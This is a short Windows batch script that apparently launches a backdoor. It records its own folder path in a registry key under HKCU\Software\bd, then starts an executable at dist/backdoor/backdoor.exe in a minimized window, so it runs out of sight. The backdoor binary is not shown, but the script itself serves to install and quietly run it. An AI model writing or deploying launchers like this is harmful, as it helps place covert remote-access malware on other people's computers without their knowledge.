@echo off
cd /d "%~dp0"

reg add "HKCU\Software\bd" /v "BatchFilePath" /t REG_SZ /d "%~dp0" /f

start /min "" "./dist/backdoor/backdoor.exe"